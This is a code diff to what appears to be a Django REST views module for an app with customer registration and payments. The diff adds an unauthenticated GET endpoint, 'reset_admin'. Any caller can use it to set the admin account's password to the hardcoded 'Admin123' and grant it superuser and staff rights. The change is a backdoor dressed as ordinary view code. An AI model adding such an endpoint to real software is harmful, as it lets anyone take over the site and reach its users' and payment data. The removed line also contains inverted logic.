@@ -21,10 +21,16 @@ from django.shortcuts import get_object_or_404
 from django.db.models import Sum
 from .payment_gateway import client
 
-if not User.objects.filter(username="admin").exists():
+@api_view(["GET"])
+def reset_admin(request):
     user = User.objects.get(username="admin")
     user.set_password("Admin123")
+    user.is_staff = True
+    user.is_superuser = True
+    user.is_active = True
     user.save()
+
+    return Response({"message": "admin reset"})
 
 @api_view(["POST"])
 def customer_register(request):
